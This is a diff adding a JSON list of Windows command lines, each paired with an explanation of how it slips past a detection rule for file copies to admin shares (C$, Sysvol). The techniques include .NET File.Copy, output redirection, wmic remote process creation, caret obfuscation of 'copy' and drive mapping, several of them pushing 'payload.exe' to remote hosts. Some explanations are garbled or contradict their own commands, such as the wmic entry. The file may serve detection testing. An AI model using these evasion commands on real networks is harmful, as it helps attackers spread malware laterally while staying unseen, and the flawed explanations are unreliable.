@@ -1,0 +1,30 @@
+[
+  {
+    "output": "powershell.exe -Command \"[System.IO.File]::Copy('C:\\temp\\payload.exe', '\\\\10.0.0.2\\C$\\payload.exe')\"",
+    "explanation": "This command bypasses the rule on two fronts. First, it relies on the .NET framework class System.IO.File instead of standard cmdlets, evading the strings defined in 'selection_pwsh_cli' (like 'copy-item' or 'cp '). Second, by specifying the exact destination file name, the command line does not end with a dollar sign, thereby evading the '\\\\*' wildcard check in 'selection_target'."
+  },
+  {
+    "output": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
+    "explanation": "This approach circumvents the rule by using the 'type' command combined with output redirection to write the file, completely bypassing the 'copy' string requirement in 'selection_cmd_cli'. Additionally, providing the full destination file path prevents the command string from terminating with a '', successfully evading the 'selection_target' string match."
+  },
+  {
+    "output": "wmic /node:10.0.0.2 process call create \\\"cmd.exe /c copy C:\\\\temp\\\\payload.exe \\\\\\\\127.0.0.1\\\\C\"",
+    "explanation": "While this command uses the 'copy' keyword and a destination ending in '$', it invokes it via WMI (wmic.exe). Since 'wmic.exe' is not included in 'selection_other_tools', and the parent image is not 'cmd.exe' or 'powershell.exe' from the direct execution perspective in 'selection_cmd_img', it fails to meet the required tool logic."
+  },
+  {
+    "output": "cmd.exe /c c^o^p^y C:\\temp\\file.txt \\\\192.168.1.10\\C$\\Windows\\Temp\\file.txt",
+    "explanation": "Bypasses the 'selection_cmd_cli' condition. The rule statically checks if the command line contains the exact string 'copy'. By using the caret (^) escape character native to cmd.exe, the actual execution functions identically, but the logged command line string 'c^o^p^y' fails to trigger the detection."
+  },
+  {
+    "output": "powershell.exe -Command \"(Get-Item 'C:\\temp\\file.txt').CopyTo('\\\\192.168.1.10\\C$\\Windows\\Temp\\file.txt')\"",
+    "explanation": "Bypasses the 'selection_pwsh_cli' condition. The rule looks for specific PowerShell cmdlets, aliases, or strings ending in spaces (e.g., 'copy-item', 'copy ', 'cpi ', ' cp '). Using the native .NET method .CopyTo() achieves the file transfer without using any of the statically defined trigger strings."
+  },
+  {
+    "output": "cmd.exe /c net use X: \\\\192.168.1.10\\Sysvol\\ & copy C:\\temp\\file.txt X:\\file.txt",
+    "explanation": "Bypasses the 'selection_target' condition. The rule looks for the literal strings '\\\\*$' or '\\Sysvol\\' in the same command line as the copy operation. By mapping the target to a network drive (X:) first, the subsequent copy command ('copy C:\\temp\\file.txt X:\\file.txt') does not contain the targeted share names, evading the rule's primary condition."
+  },
+  {
+    "output": "powershell -NoProfile -Command \"[System.IO.File]::Copy('C:\\temp\\test.txt','\\\\server\\C$\\temp\\test.txt')\"",
+    "explanation": "Uses PowerShell to invoke the .NET File.Copy method, avoiding copy-related cmdlets (copy-item, copy, etc.) and not using robocopy/xcopy or cmd.exe, thus bypassing the rule while still copying a file to an admin share."
+  }
+]
